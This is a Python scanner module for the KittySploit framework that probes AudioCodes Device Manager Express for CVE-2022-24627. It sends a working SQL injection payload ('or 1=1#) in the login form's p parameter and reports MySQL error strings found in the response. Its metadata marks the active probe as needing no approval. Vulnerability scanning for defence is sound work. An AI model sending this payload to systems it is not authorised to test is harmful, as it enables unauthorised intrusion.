#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered in AudioCodes Device Manager Express through 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AudioCodes Device Manager Express - SQL Injection Detection',
        'description': 'An issue was discovered in AudioCodes Device Manager Express through 7.8.20002.47752. It is an unauthenticated SQL injection in the p parameter of the process_login.php login form.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'seclists', 'sqli', 'audiocodes', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2023/Feb/12',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-24627',
            'https://github.com/tr3ss/newclei',
        ],
        'cve': 'CVE-2022-24627',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/admin/AudioCodes_files/process_login.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=admin&password=&domain=&p=%5C%27or+1%3D1%23\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('SQL syntax', 'mysql_fetch', 'You have an error in your SQL syntax',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='AudioCodes Device Manager Express - SQL Injection detected', path=path)
            return True
        return False

